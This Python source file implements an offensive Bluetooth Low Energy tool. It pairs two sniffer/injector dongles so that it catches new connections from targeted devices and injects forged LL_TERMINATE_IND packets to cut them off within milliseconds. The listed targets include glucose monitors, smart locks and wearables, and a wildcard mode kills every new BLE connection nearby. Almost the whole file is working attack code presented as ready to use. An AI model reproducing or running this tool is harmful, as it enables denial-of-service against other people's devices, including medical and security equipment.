"""
BlueShield AutoTerminator (v7.6)

THE BEST BLE ATTACK THIS HARDWARE CAN DO.

Two-dongle pipeline: one ButteRFly observes the air for CONNECT_IND on BLE
advertising channels 37/38/39. When it catches one matching a target MAC,
it extracts the connection's Access Address and hands it to a second
ButteRFly, which immediately injects an LL_TERMINATE_IND.

Effect: any targeted BLE device (smartwatch, fitness band, AirPods BLE
companion link, smart lock, BLE beacon, glucose monitor, BLE HID) gets
force-disconnected within ~50ms of establishing a new connection.

Attack model per Cayre et al. "InjectaBLE: Injecting Malicious Traffic
into Established Bluetooth Low Energy Connections." IEEE/IFIP DSN 2021.
We never capture the audio link — that's BR/EDR and physically
unreachable from BLE-only hardware. We kill the COMPANION LINK, which
iOS/Android use to coordinate the BR/EDR audio session. When the
companion drops, the target device usually disconnects audio as a
side-effect.

Architecture:

   ┌──────────────────────────────────────────────────┐
   │   BlueShield Main Process                         │
   │                                                   │
   │  ┌────────────────┐  queue.Queue  ┌─────────────┐ │
   │  │ Observer thread │──CONNECT_IND─▶│ Injector    │ │
   │  │ ButteRFly #1    │   events     │ thread      │ │
   │  │ /dev/ttyACM0    │              │ ButteRFly #2│ │
   │  │ Sniffer mode    │              │ /dev/ttyACM1│ │
   │  │ Watches adv chs │              │ Inject PDU  │ │
   │  └────────────────┘              └─────────────┘ │
   │                                                   │
   │  Kill list: MAC → TARGET_IDENTIFIED               │
   └──────────────────────────────────────────────────┘

Usage:
    from blueshield.jammer.auto_terminator import AutoTerminator
    auto = AutoTerminator(observer_port="/dev/ttyACM0",
                          injector_port="/dev/ttyACM1")
    auto.add_target("AA:BB:CC:DD:EE:FF")
    auto.start()
    # When matching CONNECT_IND is seen, LL_TERMINATE_IND fires automatically
"""
import os
import threading
import time
from queue import Queue, Empty
from typing import Optional, Set

try:
    from whad.device import WhadDevice
    from whad.ble.connector.sniffer import Sniffer as BLESniffer
    from whad.ble.connector.injector import Injector as BLEInjector
    from scapy.layers.bluetooth4LE import (
        BTLE, BTLE_ADV, BTLE_CONNECT_REQ, BTLE_DATA, BTLE_CTRL,
        LL_TERMINATE_IND,
    )
    HAS_DEPS = True
except ImportError:
    HAS_DEPS = False


class AutoTerminator:
    """Two-ButteRFly pipeline: observe CONNECT_IND → auto-inject TERMINATE_IND."""

    def __init__(self, observer_port: str = "/dev/ttyACM0",
                 injector_port: str = "/dev/ttyACM1"):
        self.observer_port = observer_port
        self.injector_port = injector_port
        self._observer_device = None
        self._observer_connector = None
        self._injector_device = None
        self._injector_connector = None
        self.kill_list: Set[str] = set()   # target MAC addresses (uppercase)
        self._q: "Queue[tuple]" = Queue(maxsize=32)
        self._observer_thread: Optional[threading.Thread] = None
        self._injector_thread: Optional[threading.Thread] = None
        self._stop = threading.Event()
        self._start_time: float = 0.0
        self.connect_inds_seen: int = 0
        self.injections_sent: int = 0
        self.last_target_aa: Optional[int] = None
        self.last_target_mac: Optional[str] = None
        self.last_error: Optional[str] = None
        self.is_active: bool = False

    def add_target(self, mac: str):
        """Add a MAC address to the kill list. Case-insensitive."""
        self.kill_list.add(mac.upper().strip())

    def remove_target(self, mac: str):
        self.kill_list.discard(mac.upper().strip())

    def target_all(self):
        """Wildcard mode: terminate ANY new BLE connection seen on air."""
        self.kill_list.add("FF:FF:FF:FF:FF:FF")

    def start(self) -> bool:
        """Open both dongles, start observer + injector threads."""
        if not HAS_DEPS:
            self.last_error = "whad or scapy missing"
            return False
        if self.is_active:
            return True
        if not os.path.exists(self.observer_port):
            self.last_error = f"observer port {self.observer_port} not found"
            return False
        if not os.path.exists(self.injector_port):
            self.last_error = f"injector port {self.injector_port} not found"
            return False

        try:
            self._observer_device = WhadDevice.create(f"uart:{self.observer_port}")
            self._observer_device.open()
            self._observer_device.discover()

            self._injector_device = WhadDevice.create(f"uart:{self.injector_port}")
            self._injector_device.open()
            self._injector_device.discover()
        except Exception as e:
            self.last_error = f"device open: {type(e).__name__}: {e}"
            return False

        self._stop.clear()
        self._start_time = time.monotonic()
        self.is_active = True

        self._observer_thread = threading.Thread(
            target=self._observer_loop, daemon=True, name="auto-observer")
        self._injector_thread = threading.Thread(
            target=self._injector_loop, daemon=True, name="auto-injector")
        self._observer_thread.start()
        self._injector_thread.start()
        return True

    def stop(self) -> bool:
        """Shut down both threads cleanly."""
        self._stop.set()
        self.is_active = False
        for t in (self._observer_thread, self._injector_thread):
            if t and t.is_alive():
                t.join(timeout=2.0)
        for conn in (self._observer_connector, self._injector_connector):
            if conn:
                try: conn.stop()
                except Exception: pass
        for dev in (self._observer_device, self._injector_device):
            if dev:
                try: dev.close()
                except Exception: pass
        self._observer_connector = None
        self._injector_connector = None
        self._observer_device = None
        self._injector_device = None
        return True

    # ------------------------------------------------------------------
    # Observer: watch CONNECT_IND events, queue targets
    # ------------------------------------------------------------------

    def _observer_loop(self):
        """Sniff advertising channels; emit CONNECT_IND events to queue."""
        try:
            self._observer_connector = BLESniffer(self._observer_device)
            self._observer_connector.sniff_advertisements()
            self._observer_connector.start()
        except Exception as e:
            self.last_error = f"observer setup: {e}"
            return

        while not self._stop.wait(0.01):
            try:
                for pkt in self._observer_connector.sniff(timeout=0.2):
                    self._handle_packet(pkt)
            except Exception:
                time.sleep(0.2)

    def _handle_packet(self, pkt):
        """Decode a sniffed packet; if CONNECT_IND for a target MAC, queue it."""
        try:
            # Scapy-decode to find CONNECT_IND
            if not hasattr(pkt, '__contains__'):
                raw = bytes(pkt)
                # Attempt scapy decode
                try:
                    scapy_pkt = BTLE_ADV(raw)
                except Exception:
                    return
            else:
                scapy_pkt = pkt

            if BTLE_CONNECT_REQ not in scapy_pkt:
                return

            cr = scapy_pkt[BTLE_CONNECT_REQ]
            adv_mac = getattr(cr, 'AdvA', None)
            if not adv_mac:
                return
            adv_mac_str = str(adv_mac).upper()
            aa = getattr(cr, 'AA', None) or getattr(cr, 'access_addr', None)
            if aa is None:
                return

            self.connect_inds_seen += 1

            # Check kill list
            in_kill = (adv_mac_str in self.kill_list or
                       "FF:FF:FF:FF:FF:FF" in self.kill_list)
            if in_kill:
                self._q.put(('terminate', int(aa), adv_mac_str))
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Injector: consume queue, inject LL_TERMINATE_IND
    # ------------------------------------------------------------------

    def _injector_loop(self):
        """Drain queue; for each target AA, inject LL_TERMINATE_IND."""
        try:
            self._injector_connector = BLEInjector(self._injector_device)
        except Exception as e:
            self.last_error = f"injector setup: {e}"
            return

        while not self._stop.wait(0.01):
            try:
                cmd, aa, mac = self._q.get(timeout=0.5)
            except Empty:
                continue
            if cmd != 'terminate':
                continue
            try:
                pdu = (BTLE(access_addr=aa) /
                       BTLE_DATA(LLID=3) /
                       BTLE_CTRL() /
                       LL_TERMINATE_IND(code=0x13))
                # Inject 3 times with short spacing to maximize landing
                for _ in range(3):
                    self._injector_connector.inject_to_slave(pdu)
                    self.injections_sent += 1
                    time.sleep(0.010)
                self.last_target_aa = aa
                self.last_target_mac = mac
            except Exception as e:
                import traceback
                tb = traceback.format_exc(limit=3).strip().splitlines()[-1]
                self.last_error = f"inject AA=0x{aa:08x}: {type(e).__name__}: {e or tb}"

    # ------------------------------------------------------------------
    # Status
    # ------------------------------------------------------------------

    def get_stats(self) -> dict:
        return {
            "is_active": self.is_active,
            "elapsed_seconds": time.monotonic() - self._start_time if self._start_time else 0.0,
            "kill_list_size": len(self.kill_list),
            "kill_list": list(self.kill_list),
            "connect_inds_seen": self.connect_inds_seen,
            "injections_sent": self.injections_sent,
            "last_target_aa_hex": f"0x{self.last_target_aa:08x}" if self.last_target_aa else None,
            "last_target_mac": self.last_target_mac,
            "observer_port": self.observer_port,
            "injector_port": self.injector_port,
            "last_error": self.last_error,
            "backend": "auto_terminator_v1",
        }
